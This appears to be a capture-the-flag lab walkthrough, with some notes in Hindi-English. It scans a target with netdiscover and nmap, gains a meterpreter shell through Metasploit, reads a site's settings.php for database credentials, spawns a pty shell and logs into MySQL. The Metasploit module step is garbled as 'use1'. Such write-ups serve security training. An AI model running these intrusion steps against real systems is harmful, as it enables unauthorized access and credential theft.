# Step 1
-     sudo netdiscover
  to find ip address

# Step 2 

-     nmap -A 192.168.1.7(ip Address)
```
-A meaning (Aggressive scan)
- Aggressive scan chalata hai jisme Nmap automatically ye sab detect karta hai:
- OS detection (system kaun sa chal raha hai)
- Service & version detection (ports pe kya software chal raha hai)
- Default NSE scripts (basic vulnerability checks)
- Traceroute (target tak ka network path)
```
- The NMAP scan indicates that three ports are open: 22 (SSH), 80 (HTTP), and 111 (RPC).
- Discovering that port 80 is running HTTP, we proceed to open the IP address in our web browser.
![1_2Kwm-x_URC1htqpofvbB3g](https://github.com/user-attachments/assets/4abe3213-2297-474e-9f36-7472a6043ed4)
- Gaining access through Metasploit

# Step 3


-     msfconsole
-  you will get msf6
-  And After
- ![1_vYyh1BcTAxysdOKYpbWjYg](https://github.com/user-attachments/assets/88fb3e8a-d276-44f7-a44c-c35519021158)
- **use1**
- ![1_i0hVEshkcVHx4unvqfV4gg](https://github.com/user-attachments/assets/268ac80a-eb8a-4e81-a412-a280936df712)
- **set RHOSTS 192.168.1.7**
  ![1_dQ4C8mnztFsqlIDKfaET_Q](https://github.com/user-attachments/assets/ae64d4e2-16b3-4b48-b374-6c1a027e33a9)
- **run**
![1__mNmz52EWe1j-2-RfrAP_A](https://github.com/user-attachments/assets/ac9354d6-8c8c-483f-a5ee-cc670cb34ccd)
- and we got the meterpreter shell
- ![1_zGF30kTNo0bayg3SM2ezUQ](https://github.com/user-attachments/assets/5f293e8a-6e73-4412-9beb-ec7a67453dbe)
# And we got our first flag flag1.txt
- Let’s open flag1.txt to get hint.
-     cat flag1.txt
- ![1_A24YvaXAcm-YfNt87uQurA](https://github.com/user-attachments/assets/e13134c4-0d18-4fec-8f09-6f1318b3444e)
-     cd sites
-     ls
- ![1_yF6oD1C36u2Zy1rm2Ceelg](https://github.com/user-attachments/assets/14ca2769-070b-4b1e-bf46-b0b8c318947f) 
-     cd default
-     ls
- ![1_qDVAZZ7rJAEvn5aV5Nx-lQ](https://github.com/user-attachments/assets/8db89e37-c5cb-43f0-a86a-ad5c14c95f31)
-     cat settings.php
- ![1_aft07dyy-H4M9sy1uIisJQ](https://github.com/user-attachments/assets/d48993a7-fba0-42a1-abed-8fa7fbc9f783)
# And we got our Second flag
-     python -c 'import pty; pty.spawn("/bin/bash")'
- ![1_Am6KhzR7UdJ0tRKz13eWXA](https://github.com/user-attachments/assets/6fec0f1b-3cc8-4aae-8d65-ae01043b200b)
-      mysql -u dbuser -p
-  ![1_Y-bhof_z2Q_7qOeCqcbovA](https://github.com/user-attachments/assets/ae70ad77-5473-42c3-b245-2ad040925f40)

